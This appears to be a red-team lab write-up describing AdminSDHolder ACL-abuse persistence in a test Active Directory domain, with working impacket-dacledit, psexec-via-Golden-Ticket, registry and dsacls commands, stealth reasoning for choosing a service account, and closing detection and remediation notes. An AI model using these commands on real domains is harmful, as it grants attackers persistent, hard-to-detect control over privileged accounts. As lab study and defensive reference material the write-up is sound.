Objective:

Abuse write access to the AdminSDHolder object to plant a backdoor ACE that SDProp
automatically propagates to every protected account in the domain every 60 minutes —
giving a low-privilege account persistent FullControl over all high-value accounts
without ever touching Domain Admins group membership directly. Used because a
Golden Ticket dies on double krbtgt rotation; persistence through ACL abuse survives that response.

Environment:

  . Attacker: Kali Linux
  . Target: Windows Server 2022 DC (WIN-56JEHJD0RI3, redteamlab.local)
  . Access account: Administrator (Domain Admin)
  . Persistence account: svc_backup (low-privilege, no domain groups, Kerberoasted in Lab 2.4)

Prerequisites:

 . Domain Admin access via Administrator account
 . krbtgt NT hash from DCSync (Lab 2.10)
 . Golden Ticket forged and loaded in ccache
 . svc_backup credentials known from Lab 2.4

 Key Concepts:

AdminSDHolder: An AD object at
CN=AdminSDHolder,CN=System,DC=redteamlab,DC=local that holds a template ACL for all protected accounts in the
domain.

SDProp (Security Descriptor Propagator): A background process running on the PDC
Emulator every 60 minutes that overwrites the ACL of every protected account with an
exact copy of AdminSDHolder's current ACL — regardless of what was there before.

Protected accounts in redteamlab.local: Administrator, Domain Admins, Enterprise Admins, Schema Admins,
Group Policy Creator Owners, krbtgt, Administrators (builtin), and any account with AdminCount:1 (including jdoe)

Why svc_backup:

 . Existing account — no new account creation anomaly
 . Service accounts are rarely audited for granted permissions
 . No pre-existing suspicious flags (unlike jdoe's AdminCount:True)

Attack Steps:
Step 1 — Sync clock
bash
 sudo ntpdate 192.168.56.101

step 2 - Export Golden Ticket
bash 
    export KRB5CCNAME=$(pwd)/Administrator.ccache
    klist -c Administrator.ccache

step 3 - Write FullControl ACE for svc_backup onto AdminSDHolder
bash
    impacket-dacledit -action write -rights FullControl \
  -principal svc_backup \
  -target-dn "CN=AdminSDHolder,CN=System,DC=redteamlab,DC=local" \
  redteamlab.local/Administrator:'<password>' -dc-ip 192.168.56.101

  output:[*] DACL modified successfully!

Step 4 - Verify ACE landed on AdminSDHolder
bash
    impacket-dacledit -action read \
  -target-dn "CN=AdminSDHolder,CN=System,DC=redteamlab,DC=local" \
  redteamlab.local/Administrator:'<password>' -dc-ip 192.168.56.101

Confirmed:
          ACE Type    : ACCESS_ALLOWED_ACE
          Access mask : FullControl (0xf01ff)
          Trustee     : svc_backup (S-1-5-21-...-1108)

Step 5 - Get shell on DC via Golden Ticket
bash
     impacket-psexec -k -no-pass \
       redteamlab.local/Administrator@WIN-56JEHJD0RI3.redteamlab.local

Step 6 - Force SDProp immediately
cmd
   reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v RunProtectAdminGroupsTask /t REG_DWORD /d 1 /f

Note:
     Windows resets this value to 0 after SDProp runs - verify propagation via ACL check,not registry

Step 7 - Verify Propagation to protected accounts
cmd
    dsacls "CN=Administrator,CN=Users,DC=redteamlab,DC=local" | findstr /i "svc_backup"

Confirmed:
          Allow REDTEAMLAB\svc_backup FULL CONTROL


Troubleshooting Notes:
  . impacket-reg with plaintext password failed due to @ in password being misread by credential parser —
    workaround: use psexec shell + native reg add
  . impacket-reg with -k -no-pass failed with list index out of range —
    known bug in this impacket dev build with Kerberos auth
  . KRB_AP_ERR_SKEW — clock drift exceeded 5 minutes; fixed with ntpdate
  . Windows Defender on DC flagged remote registry access — disabled for lab purposes

Real-World Impact:

 svc_backup — a service account with no domain group memberships, cracked from Kerberoasting in Lab 2.4 —
 now has FullControl over every protected account in the domain. Even if the Golden Ticket is burned
 via krbtgt rotation, svc_backup can reset Administrator's password,
 add itself to Domain Admins, or run DCSync again. The domain is persistently owned.

Detection:
  . Event ID 4670 on the DC if auditing enabled on AdminSDHolder (not default)
  . BloodHound re-ingestion shows svc_backup → AdminSDHolder edge
  . Direct ACL review of AdminSDHolder Security tab in ADUC (Advanced Features must be enabled)
  . Cleaning protected account ACLs without cleaning AdminSDHolder first — permission re-appears
    within 60 minutes

Remediation (Full):
  1. Find and remove the malicious ACE from AdminSDHolder itself
  2. Force SDProp to run and propagate the cleaned ACL to all protected accounts
  3. Verify every protected account no longer has the backdoor ACE
  4. Investigate how the attacker obtained write access to AdminSDHolder

Key Lessons:
  . AdminSDHolder is infrastructure — most defenders never audit its ACL directly
  . SDProp re-infects every protected account every 60 minutes — cleaning individual accounts is not a fix
  . Service accounts are stealth-optimal for backdoor ACEs
  . Verify propagation independently (dsacls) — never trust a tool's success message alone
  . Clock sync is a prerequisite for every Kerberos tool

Interview Explanation:
     "After achieving Domain Admin access via Golden Ticket, I planted a secondary
     persistence mechanism using AdminSDHolder ACL abuse. AdminSDHolder holds a template ACL
     that SDProp automatically copies to every privileged account in the domain every 60 minutes.
     By granting FullControl on AdminSDHolder to svc_backup — a low-privilege service account —
     I ensured that even if the Golden Ticket was invalidated, svc_backup would retain full control
     over every protected account. I verified end-to-end: confirmed the ACE on AdminSDHolder via dacledit read,
     forced SDProp immediately via a registry trigger, and confirmed propagation to the Administrator account
     using dsacls."
   
